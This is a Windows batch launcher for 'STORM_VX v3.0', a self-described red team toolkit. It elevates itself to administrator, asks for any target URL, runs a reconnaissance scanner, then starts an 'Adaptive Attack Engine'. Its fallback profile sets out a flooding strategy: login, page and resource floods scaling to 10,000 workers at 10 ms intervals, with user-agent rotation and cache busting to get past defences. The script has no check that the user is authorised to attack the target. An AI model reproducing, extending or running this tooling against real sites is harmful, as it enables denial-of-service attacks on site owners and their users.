@echo off
setlocal enabledelayedexpansion

title STORM_VX v3.0 - Full Pipeline

:: ============================================================
::  STORM_VX v3.0 - Modular Red Team Toolkit
::  by elite (taha)
::  Full Pipeline: FINDER (deep scan) -> TESTER (auto attack)
::
::  FIX: Rewritten to handle paths with spaces and parentheses
::  (e.g. "C:\Users\taha1\Downloads\Storm-Vx (9)")
::  Root cause: CMD interprets ( ) in expanded %VAR% as block
::  delimiters inside IF/FOR statements. Using !VAR! (delayed
::  expansion) expands AFTER parsing, so parentheses are safe.
:: ============================================================

:: -- Save path BEFORE elevation --
set "SELF_PATH=%~f0"
set "ROOT_DIR=%~dp0"

:: -- Strip trailing backslash to avoid CMD escape issues --
:: Uses delayed expansion so parentheses in path don't break IF
if "!ROOT_DIR:~-1!"=="\" set "ROOT_DIR=!ROOT_DIR:~0,-1!"

:: -- UAC Admin Elevation --
net session >nul 2>&1
if !errorlevel!==0 goto :is_admin

echo   [INFO] Requesting Administrator privileges...
powershell -Command "Start-Process cmd.exe -ArgumentList '/k \"!SELF_PATH!\"' -Verb RunAs" 2>nul
if !errorlevel! geq 1 (
    echo   [ERROR] Failed to elevate. Right-click run.bat & select 'Run as administrator'.
    pause
    exit /b 1
)
exit /b

:is_admin

cd /d "!ROOT_DIR!"

echo.
echo   SSSSS  TTTTT  OOO  RRRR  M   M       V       V  X  X
echo   SS       T   O   O R   R MM MM        V     V    X  X
echo   SSSSS    T   O   O RRRR  M M M         V   V      XX
echo      SS    T   O   O R   R M   M          V V      X  X
echo   SSSSS    T    OOO  R   R M   M           V      X  X
echo.
echo                    BY ELiteTH
echo.
echo   +==================================================+
echo   :              S T O R M _ V X  v3.0              :
echo   :           Full Pipeline - FINDER + TESTER        :
echo   +==================================================+
echo.
echo   [OK] Running as Administrator
echo   [MODE] FINDER (Deep Scan) -- TESTER (Auto Attack)
echo.

:: ============================================================
::  FILE DISCOVERY
:: ============================================================

:: --- Debug: show root dir ---
echo   [DEBUG] ROOT_DIR = "!ROOT_DIR!"

:: --- Find VF_FINDER.py ---
set "FINDER_PATH="
if exist "!ROOT_DIR!\VF_FINDER.py" (
    set "FINDER_PATH=!ROOT_DIR!\VF_FINDER.py"
)
if not defined FINDER_PATH if exist "!ROOT_DIR!\finder\VF_FINDER.py" (
    set "FINDER_PATH=!ROOT_DIR!\finder\VF_FINDER.py"
)

if not defined FINDER_PATH (
    echo   [ERROR] VF_FINDER.py not found!
    echo   [INFO] Searched in:
    echo          !ROOT_DIR!\
    echo          !ROOT_DIR!\finder\
    echo   [INFO] Make sure you extracted ALL files from the zip
    echo          and run.bat is in the Storm-Vx root folder.
    pause
    exit /b 1
)

:: --- Find VF_TESTER.py ---
set "TESTER_PATH="
if exist "!ROOT_DIR!\tester\VF_TESTER.py" (
    set "TESTER_PATH=!ROOT_DIR!\tester\VF_TESTER.py"
)
if not defined TESTER_PATH if exist "!ROOT_DIR!\VF_TESTER.py" (
    set "TESTER_PATH=!ROOT_DIR!\VF_TESTER.py"
)

if not defined TESTER_PATH (
    echo   [ERROR] VF_TESTER.py not found!
    echo   [INFO] Searched in:
    echo          !ROOT_DIR!\tester\
    echo          !ROOT_DIR!\
    echo   [INFO] Make sure you extracted ALL files from the zip
    echo          and run.bat is in the Storm-Vx root folder.
    pause
    exit /b 1
)

:: --- PYTHONPATH ---
:: BUG-FIX: Added ui/ and config/ to PYTHONPATH. Without these, Python
:: cannot import ui.dashboard or config.defaults when running from run.bat,
:: causing ImportError and falling back to default/minimal UI rendering.
set "PYTHONPATH=!ROOT_DIR!\finder;!ROOT_DIR!\tester;!ROOT_DIR!\evasion;!ROOT_DIR!\infra;!ROOT_DIR!\ui;!ROOT_DIR!\config;!ROOT_DIR!;%PYTHONPATH%"

echo   [OK] FINDER : !FINDER_PATH!
echo   [OK] TESTER : !TESTER_PATH!
echo.

:: --- Check Python dependencies ---
echo   [CHECK] Verifying Python dependencies...
pip show aiohttp >nul 2>&1
if !errorlevel! geq 1 (
    echo   [WARN] aiohttp not installed. Installing...
    pip install aiohttp httpx[http2] beautifulsoup4 --quiet
)
echo   [OK] Dependencies ready

python --version >nul 2>&1
if !errorlevel! geq 1 (
    echo   [ERROR] Python is not installed or not in PATH.
    echo   [INFO] Install Python 3.10+ from https://www.python.org/downloads/
    echo          Make sure to check "Add Python to PATH" during installation.
    pause
    exit /b 1
)

for /f "tokens=2 delims= " %%v in ('python --version 2^>^&1') do set "PY_VER=%%v"
echo   [OK] Python : !PY_VER!
echo.

:: ============================================================
::  GET TARGET URL
:: ============================================================
set "TARGET_URL="
set "FINDER_FLAGS=--deep --dns"
set "EXTRA_FLAGS="

:parse_args
if "%~1"=="" goto :done_parsing
if /i "%~1"=="--no-deep" ( set "FINDER_FLAGS=--dns" & shift & goto :parse_args )
if /i "%~1"=="--no-dns" ( set "FINDER_FLAGS=--deep" & shift & goto :parse_args )
if /i "%~1"=="--fresh" ( set "EXTRA_FLAGS=--fresh" & shift & goto :parse_args )
set "TARGET_URL=%~1"
shift
goto :parse_args
:done_parsing

if not "!TARGET_URL!"=="" goto :url_ready
echo   --------------------------------------------------
echo    Enter target URL (e.g. https://target.com)
echo   --------------------------------------------------
echo.
set /p "TARGET_URL=   URL: "

if "!TARGET_URL!"=="" (
    echo   [ERROR] No URL provided.
    pause
    exit /b 1
)

:url_ready

:: -- Auto-add https:// --
echo.!TARGET_URL! | findstr /i "^https:// ^http://" >nul 2>&1
if !errorlevel! geq 1 set "TARGET_URL=https://!TARGET_URL!"

echo   [TARGET] !TARGET_URL!
echo.

:: ============================================================
::  PHASE 1: VF_FINDER - Deep Reconnaissance Scan
::  (FINDER now handles caching internally via VF_CACHE.json)
:: ============================================================
set "PROFILE_PATH=!ROOT_DIR!\VF_PROFILE.json"

echo   ==================================================
echo   [PHASE 1] VF_FINDER - Deep Reconnaissance Scan
echo   ==================================================
echo   Target : !TARGET_URL!
echo   Mode   : DEEP SCAN + DNS
echo.

python "!FINDER_PATH!" "!TARGET_URL!" !FINDER_FLAGS! !EXTRA_FLAGS! --output "!PROFILE_PATH!"
set "FINDER_EXIT=!errorlevel!"

if !FINDER_EXIT! neq 0 (
    echo.
    echo   [WARN] FINDER exited with code !FINDER_EXIT!. Attempting to continue...
    echo.
)

if exist "!PROFILE_PATH!" (
    echo.
    echo   [OK] Profile saved: VF_PROFILE.json
    echo.
) else (
    echo.
    echo   [WARN] FINDER did not create profile. Creating minimal profile...
    echo.
    :: Create a minimal profile so TESTER can still run
    echo {"url": "!TARGET_URL!", "waf": null, "cms": null, "viewstate_present": false, "technologies": [], "attack_profile": {"recommended_strategy": "GENERIC_FLOOD", "attack_vectors": ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"], "worker_config": {"initial_workers": 50, "max_workers": 10000, "step": 100, "step_duration": 3}, "page_targets": [], "resource_targets": [], "waf_strategy": {"detected": false}, "request_config": {"delay_between_requests_ms": 10}, "evasion_config": {"rotate_user_agent": true, "cache_bust": true}}} > "!PROFILE_PATH!"
)

echo   ==================================================
echo   [DONE] FINDER scan completed.
echo   ==================================================
echo.

if not exist "!PROFILE_PATH!" (
    echo   [ERROR] No profile available. Cannot start TESTER.
    pause
    exit /b 1
)

:: ============================================================
::  PHASE 2: VF_TESTER - Adaptive Attack Engine
:: ============================================================
echo   ==================================================
echo   [PHASE 2] VF_TESTER - Adaptive Attack Engine
echo   ==================================================
echo   Profile : VF_PROFILE.json
echo   Strategy: Auto (with user confirmation)
echo.
echo   [CONTROLS] + = more workers ^| - = fewer workers ^| Q = quit
echo.

:: --- Ensure UTF-8 terminal for box-drawing characters ---
chcp 65001 >nul 2>&1

python "!TESTER_PATH!" --profile "!PROFILE_PATH!"
set "TESTER_EXIT=!errorlevel!"

if !TESTER_EXIT! neq 0 (
    echo.
    echo   [WARN] TESTER exited with code !TESTER_EXIT!.
    echo   [HINT] Make sure Python dependencies are installed:
    echo          pip install aiohttp httpx beautifulsoup4
    echo.
)

echo.
echo   ==================================================
echo   [DONE] STORM_VX Pipeline Completed
echo   ==================================================
echo.
pause
